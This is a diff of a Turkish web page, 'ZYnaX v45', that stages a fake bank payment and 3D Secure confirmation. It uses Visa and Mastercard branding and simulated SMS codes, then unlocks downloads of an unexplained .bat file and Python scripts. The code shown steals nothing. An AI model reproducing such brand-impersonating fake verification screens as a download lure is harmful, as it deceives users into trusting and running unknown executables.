@@ -2,132 +2,145 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>ZYnaX v45 | SECURE GATEWAY</title>
+    <title>ZYnaX v45 | BANK GRADE SECURITY</title>
     <style>
         body { background: #000; color: #0f0; font-family: 'Consolas', monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
         #matrix { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.15; }
 
-        /* BİLDİRİM SESİ GİBİ GELECEK SMS PANELİ */
-        #sms-notification {
-            position: fixed; top: -100px; left: 50%; transform: translateX(-50%);
-            width: 350px; background: rgba(255, 255, 255, 0.95); color: #333;
-            padding: 15px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-            z-index: 200; transition: 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            font-family: sans-serif; display: flex; align-items: center; gap: 15px;
+        /* TELEFON BİLDİRİMİ */
+        #sms-pop {
+            position: fixed; top: -120px; left: 50%; transform: translateX(-50%);
+            width: 350px; background: #fff; color: #000; padding: 15px;
+            border-radius: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.8);
+            z-index: 1000; transition: 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+            font-family: sans-serif; display: flex; align-items: center; gap: 12px;
         }
-        #sms-notification.show { top: 20px; }
+        #sms-pop.active { top: 20px; }
 
-        .glitch { font-size: 60px; font-weight: 900; text-shadow: 3px 3px #f00, -3px -3px #00f; animation: glitch 1s infinite; letter-spacing: 10px; margin-bottom: 20px; }
+        /* ANA EKRAN */
+        .glitch { font-size: 50px; font-weight: 900; text-shadow: 2px 2px #f00, -2px -2px #00f; margin-bottom: 20px; }
+        .start-btn { background: #ff9900; color: #000; padding: 15px 40px; font-size: 20px; font-weight: bold; border: none; cursor: pointer; border-radius: 5px; box-shadow: 0 0 20px #ff9900; }
 
-        .btn-main {
-            background: transparent; border: 2px solid #ff9900; color: #ff9900;
-            padding: 20px 60px; font-size: 22px; font-weight: bold; cursor: pointer;
-            border-radius: 5px; transition: 0.4s; text-transform: uppercase;
-        }
+        /* MODAL VE BANKA EKRANI */
+        #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 100; backdrop-filter: blur(10px); }
+        #modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #fdfdfd; color: #333; width: 400px; border-radius: 15px; z-index: 101; font-family: sans-serif; overflow: hidden; }
 
-        /* MODAL */
-        #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 100; backdrop-filter: blur(15px); }
-        #modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #fff; color: #333; width: 420px; padding: 0; border-radius: 15px; z-index: 101; text-align: center; overflow: hidden; font-family: sans-serif; }
+        .bank-header { background: #004a99; color: #fff; padding: 20px; text-align: left; font-weight: bold; display: flex; justify-content: space-between; }
+        .bank-content { padding: 30px; text-align: left; }
+        .input-group { margin-bottom: 15px; }
+        .input-group label { display: block; font-size: 11px; font-weight: bold; color: #777; }
+        .input-box { width: 100%; padding: 12px; margin-top: 5px; border: 1px solid #ddd; border-radius: 6px; background: #f0f0f0; font-size: 16px; box-sizing: border-box; }
+        .pay-btn { background: #0070ba; color: #fff; width: 100%; padding: 15px; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; }
 
-        /* 3D SECURE EKRANI */
-        .secure-header { background: #f8f8f8; padding: 20px; border-bottom: 1px solid #ddd; display: flex; justify-content: space-between; }
-        .secure-body { padding: 30px; text-align: left; }
-        .input-box { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; font-size: 16px; background: #eee; }
-        .pay-btn { background: #0070ba; color: #fff; width: 100%; padding: 15px; border: none; border-radius: 30px; font-weight: bold; cursor: pointer; font-size: 18px; margin-top: 15px; }
-
-        /* YÜKLEME ÇARKI */
-        #loading-screen { display: none; padding: 50px; }
-        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #0070ba; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        /* 3D SECURE / YÜKLEME */
+        #secure-screen { display: none; padding: 40px; text-align: center; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #004a99; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        @keyframes glitch { 0%, 100% { text-shadow: 3px 3px #f00, -3px -3px #00f; } 50% { text-shadow: -3px -3px #f00, 3px 3px #00f; } }
+
+        /* DOSYA MENÜSÜ */
+        #file-menu { display: none; padding: 30px; text-align: center; }
+        .file-card { display: block; background: #f8f8f8; border: 1px solid #0f0; padding: 15px; margin: 10px 0; text-decoration: none; color: #000; font-weight: bold; border-radius: 5px; transition: 0.3s; }
+        .file-card:hover { background: #0f0; color: #000; }
     </style>
 </head>
 <body>
     <canvas id="matrix"></canvas>
 
-    <div id="sms-notification">
+    <div id="sms-pop">
         <img src="https://upload.wikimedia.org/wikipedia/commons/a/ab/Android_Messages_icon.svg" width="40">
         <div>
-            <strong style="display:block; font-size: 12px; color: #666;">MESAJLAR • ŞİMDİ</strong>
-            <span id="sms-content" style="font-size: 14px; font-weight: bold;"></span>
+            <strong style="display:block; font-size: 12px; color: #666;">BANKA ONAY • ŞİMDİ</strong>
+            <span id="sms-text" style="font-size: 14px; font-weight: bold;"></span>
         </div>
     </div>
 
     <div class="glitch">ZYnaX v45</div>
-    <button class="btn-main" onclick="startSystem()">SİSTEMİ TETİKLE</button>
+    <button class="start-btn" onclick="openBank()">SİSTEMİ BAŞLAT</button>
 
     <div id="overlay"></div>
     <div id="modal">
-        <div id="payment-step">
-            <div class="secure-header">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" height="25">
-                <span style="font-weight: bold; color: #0070ba;">3D Secure™</span>
-            </div>
-            <div class="secure-body">
-                <p style="font-size: 13px; color: #666;">İşlem tutarı: <strong>150,00 TL</strong></p>
-                
-                <label style="font-size: 11px; font-weight: bold;">KART SAHİBİ</label>
-                <input type="text" class="input-box" value="Y**** M** (ABD / NY)" disabled>
-                
-                <label style="font-size: 11px; font-weight: bold;">DOĞRULAMA KODU</label>
-                <input type="text" class="input-box" id="otp-input" placeholder="SMS Kodunu Giriniz">
-                
-                <button class="pay-btn" onclick="waitAndPay()">ONAYLA VE ÖDE</button>
-                <p style="font-size: 10px; color: #999; margin-top: 10px; text-align: center;">Güvenliğiniz için IP adresiniz kaydedildi.</p>
+        <div id="bank-step">
+            <div class="bank-header"><span>GÜVENLİ ÖDEME</span><span>VISA</span></div>
+            <div class="bank-content">
+                <div class="input-group">
+                    <label>KART SAHİBİ</label>
+                    <input type="text" class="input-box" value="******** ********" disabled>
+                </div>
+                <div class="input-group">
+                    <label>KART NUMARASI</label>
+                    <input type="text" class="input-box" value="**** **** **** 4492" disabled>
+                </div>
+                <p style="font-size: 14px; font-weight: bold; color: #d32f2f;">Tutar: 150,00 TL</p>
+                <button class="pay-btn" onclick="to3DSecure()">3D SECURE İLE ÖDE</button>
             </div>
         </div>
 
-        <div id="loading-screen">
-            <div class="spinner"></div>
-            <h3 id="load-msg">Banka Onayı Bekleniyor...</h3>
-            <p id="sub-msg" style="font-size: 12px; color: #666;">TLS 1.3 Güvenli Bağlantı...</p>
+        <div id="secure-screen">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" height="30" style="margin-bottom: 20px;">
+            <div id="wait-loader">
+                <div class="spinner"></div>
+                <p>Güvenli bağlantı kuruluyor...</p>
+            </div>
+            <div id="otp-entry" style="display:none;">
+                <h3>3D Secure Onayı</h3>
+                <p style="font-size: 12px; color: #666;">Telefonunuza gelen 6 haneli kodu giriniz.</p>
+                <input type="text" id="user-otp" class="input-box" placeholder="Kod" maxlength="6" style="text-align:center; font-size: 24px; letter-spacing: 5px;">
+                <p id="error-msg" style="color:red; font-size: 12px; display:none;">Hatalı kod girdiniz!</p>
+                <button class="pay-btn" onclick="checkCode()">ONAYLA</button>
+            </div>
         </div>
 
-        <div id="success-step" style="display:none; padding: 40px;">
-            <h2 style="color: #28a745;">✔ ONAYLANDI</h2>
-            <p>Dosyalarınız hazır.</p>
-            <a href="ZYnaXPC-NO-SETUP.bat" style="display:block; padding:15px; background:#000; color:#0f0; text-decoration:none; margin:10px 0; border:1px solid #0f0;">İNDİR (.BAT)</a>
+        <div id="file-menu">
+            <h2 style="color: #28a745;">✔ ERİŞİM SAĞLANDI</h2>
+            <p style="font-size: 12px;">Sisteminize uygun dosyayı seçiniz:</p>
+            <a href="ZYnaXPC-NO-SETUP.bat" class="file-card">WINDOWS PORTABLE (.BAT)</a>
+            <a href="ZYnaXPC.py" class="file-card">WINDOWS PYTHON (.PY)</a>
+            <a href="ZYnaX_Mac.py" class="file-card">macOS VERSION (.PY)</a>
         </div>
     </div>
 
     <script>
-        function startSystem() {
+        const validCodes = ["778899", "112233", "445566", "990011", "554433"];
+        let currentCode = "";
+
+        function openBank() {
             document.getElementById('overlay').style.display = 'block';
             document.getElementById('modal').style.display = 'block';
         }
 
-        function waitAndPay() {
-            document.getElementById('payment-step').style.display = 'none';
-            document.getElementById('loading-screen').style.display = 'block';
+        function to3DSecure() {
+            document.getElementById('bank-step').style.display = 'none';
+            document.getElementById('secure-screen').style.display = 'block';
 
-            // 20 Saniyelik süreç
-            let seconds = 0;
-            const interval = setInterval(() => {
-                seconds++;
-                if(seconds == 4) document.getElementById('sub-msg').innerText = "Provizyon Sorgulanıyor...";
-                if(seconds == 8) document.getElementById('sub-msg').innerText = "3D Secure Handshake...";
-                if(seconds == 12) {
-                    // SMS GÖNDERME SİMÜLASYONU
-                    const randomCode = Math.floor(100000 + Math.random() * 900000);
-                    document.getElementById('sms-content').innerText = "Banka: 150 TL tutarındaki işleminiz için onay kodunuz: " + randomCode;
-                    document.getElementById('sms-notification').classList.add('show');
-                }
-                if(seconds == 16) document.getElementById('sub-msg').innerText = "Onay Yanıtı Alındı...";
+            // 5 saniye bekleme sonra SMS gelmesi
+            setTimeout(() => {
+                document.getElementById('wait-loader').style.display = 'none';
+                document.getElementById('otp-entry').style.display = 'block';
                 
-                if(seconds >= 20) {
-                    clearInterval(interval);
-                    document.getElementById('loading-screen').style.display = 'none';
-                    document.getElementById('success-step').style.display = 'block';
-                    document.getElementById('sms-notification').classList.remove('show');
-                }
-            }, 1000);
+                // Rastgele kod seç
+                currentCode = validCodes[Math.floor(Math.random() * validCodes.length)];
+                document.getElementById('sms-text').innerText = "ZYnaX İşlem Kodunuz: " + currentCode;
+                document.getElementById('sms-pop').classList.add('active');
+            }, 5000);
+        }
+
+        function checkCode() {
+            const input = document.getElementById('user-otp').value;
+            if (input === currentCode) {
+                document.getElementById('secure-screen').style.display = 'none';
+                document.getElementById('file-menu').style.display = 'block';
+                document.getElementById('sms-pop').classList.remove('active');
+            } else {
+                document.getElementById('error-msg').style.display = 'block';
+                document.getElementById('user-otp').value = "";
+            }
         }
 
         // Matrix Efekti
         const canvas = document.getElementById('matrix');
         const ctx = canvas.getContext('2d');
         canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-        const letters = "01ZYNAXUSA";
+        const letters = "01ZYNAX";
         const fontSize = 16;
         const columns = canvas.width / fontSize;
         const drops = Array(Math.floor(columns)).fill(1);
